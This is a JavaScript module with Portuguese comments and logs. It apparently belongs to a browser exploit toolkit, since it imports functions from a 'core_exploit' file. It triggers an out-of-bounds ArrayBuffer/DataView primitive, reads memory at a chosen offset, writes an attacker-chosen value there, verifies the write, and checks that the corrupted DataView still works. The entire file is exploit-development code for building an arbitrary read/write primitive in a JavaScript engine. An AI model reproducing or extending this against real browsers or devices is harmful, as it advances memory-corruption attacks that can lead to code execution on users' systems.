// js/script3/testReadWriteAtOffset.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export async function executeReadWriteVerificationAtOffset(
    testDescription,
    offsetToProbe, 
    valueToWrite,    
    bytesToReadWrite // Geralmente 4 para DWORD, 8 para QWORD
) {
    const FNAME_TEST = `executeReadWriteVerification<${testDescription}>`;

    logS3(`--- Iniciando Teste R/W em Offset: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Alvo Offset: ${toHex(offsetToProbe)}, Valor a Escrever: ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)}, Bytes: ${bytesToReadWrite}`, "info", FNAME_TEST);
    document.title = `Iniciando R/W Test: ${testDescription}`;

    await triggerOOB_primitive(); 
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes`, "info", FNAME_TEST);

    let stepReached = "inicio";
    let readOriginalValue = "N/A";
    let readValueAfterWrite = "N/A";
    let dvReadAfterWrite = "N/A";

    try {
        // 1. Ler o valor original no offset
        stepReached = "antes_leitura_original";
        document.title = `Lendo Original: ${testDescription}`;
        if (offsetToProbe >= 0 && offsetToProbe + bytesToReadWrite <= initialOOBArrayBufferByteLength) {
            try {
                readOriginalValue = oob_read_absolute(offsetToProbe, bytesToReadWrite);
                logS3(`Valor ORIGINAL em ${toHex(offsetToProbe)} (${bytesToReadWrite}b): ${typeof readOriginalValue === 'object' ? readOriginalValue.toString(true) : toHex(readOriginalValue)}`, "leak", FNAME_TEST);
            } catch (e_read_orig) {
                logS3(`ERRO ao ler valor original em ${toHex(offsetToProbe)}: ${e_read_orig.message}`, "error", FNAME_TEST);
                readOriginalValue = `Erro: ${e_read_orig.message}`;
            }
        } else {
            logS3(`Offset ${toHex(offsetToProbe)} fora dos limites para leitura original.`, "warn", FNAME_TEST);
            readOriginalValue = "Fora dos limites";
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // 2. Escrever o novo valor no offset
        stepReached = "antes_escrita_oob";
        document.title = `Escrevendo em ${toHex(offsetToProbe)}: ${testDescription}`;
        if (offsetToProbe >= 0 && offsetToProbe + bytesToReadWrite <= initialOOBArrayBufferByteLength) {
            logS3(`Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} em ${toHex(offsetToProbe)} (${bytesToReadWrite}b)...`, "warn", FNAME_TEST);
            oob_write_absolute(offsetToProbe, valueToWrite, bytesToReadWrite);
            logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        } else {
            logS3(`Offset ${toHex(offsetToProbe)} fora dos limites para escrita.`, "warn", FNAME_TEST);
        }
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita em ${toHex(offsetToProbe)}: ${testDescription}`;
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // 3. Ler de volta o valor no offset para confirmar a escrita
        stepReached = "antes_leitura_confirmacao";
        document.title = `Lendo Confirmação: ${testDescription}`;
        if (offsetToProbe >= 0 && offsetToProbe + bytesToReadWrite <= initialOOBArrayBufferByteLength) {
            try {
                readValueAfterWrite = oob_read_absolute(offsetToProbe, bytesToReadWrite);
                logS3(`Valor PÓS-ESCRITA em ${toHex(offsetToProbe)} (${bytesToReadWrite}b): ${typeof readValueAfterWrite === 'object' ? readValueAfterWrite.toString(true) : toHex(readValueAfterWrite)}`, "leak", FNAME_TEST);
                let valToCheck = valueToWrite;
                if (typeof valToCheck === 'object' && valToCheck.equals) { // Para AdvancedInt64
                    if (!valToCheck.equals(readValueAfterWrite)) {
                         logS3("!!! VERIFICAÇÃO FALHOU: Valor lido difere do escrito (AdvancedInt64) !!!", "error", FNAME_TEST);
                    } else {
                         logS3("Verificação OK (AdvancedInt64).", "good", FNAME_TEST);
                    }
                } else if (Number(valToCheck) !== Number(readValueAfterWrite)) {
                    logS3(`!!! VERIFICAÇÃO FALHOU: Valor lido (${toHex(Number(readValueAfterWrite))}) difere do escrito (${toHex(Number(valToCheck))}) !!!`, "error", FNAME_TEST);
                } else {
                     logS3("Verificação OK (numérico).", "good", FNAME_TEST);
                }

            } catch (e_read_confirm) {
                logS3(`ERRO ao ler valor de confirmação em ${toHex(offsetToProbe)}: ${e_read_confirm.message}`, "error", FNAME_TEST);
                readValueAfterWrite = `Erro: ${e_read_confirm.message}`;
            }
        } else {
            logS3(`Offset ${toHex(offsetToProbe)} fora dos limites para leitura de confirmação.`, "warn", FNAME_TEST);
            readValueAfterWrite = "Fora dos limites";
        }
        stepReached = "apos_leitura_confirmacao";
        document.title = `Após Leitura Confirmação: ${testDescription}`;
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // 4. Testar se oob_dataview_real ainda funciona para uma leitura simples
        stepReached = "antes_teste_dv";
        document.title = `Testando DataView: ${testDescription}`;
        try {
            if (oob_dataview_real && oob_dataview_real.buffer.byteLength > 0) { // Checa se o buffer da dataview ainda é válido
                let dvTestRead = oob_dataview_real.getUint32(0, true); // Lê do início da DataView (offset 0 relativo à DataView)
                dvReadAfterWrite = `Lido ${toHex(dvTestRead)} de oob_dataview_real[0]`;
                logS3(`Leitura de teste da oob_dataview_real[0] APÓS TODAS OPERAÇÕES: ${toHex(dvTestRead)}`, "good", FNAME_TEST);
            } else {
                dvReadAfterWrite = "oob_dataview_real nulo ou buffer zerado/inválido";
                logS3(`AVISO: oob_dataview_real nulo ou buffer zerado/inválido antes do teste de leitura DV.`, "warn", FNAME_TEST);
            }
        } catch (e_dv) {
            dvReadAfterWrite = `Erro ao ler oob_dataview_real[0]: ${e_dv.message}`;
            logS3(`ERRO ao ler oob_dataview_real[0] após todas operações: ${e_dv.message}`, "error", FNAME_TEST);
        }
        stepReached = "apos_teste_dv";
        document.title = `DataView Testada: ${testDescription}`;

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal R/W Test: ${testDescription}`;
        logS3(`Erro principal no teste R/W em Offset (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
    }
    logS3(`--- Teste R/W em Offset Concluído: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Resultados: Original=${typeof readOriginalValue === 'object' ? readOriginalValue.toString(true) : toHex(readOriginalValue)}, Pós-Escrita=${typeof readValueAfterWrite === 'object' ? readValueAfterWrite.toString(true) : toHex(readValueAfterWrite)}, Leitura Final DV=${dvReadAfterWrite}`, "info", FNAME_TEST);
    
    document.title = `Teste R/W Concluído: ${testDescription}`;
}
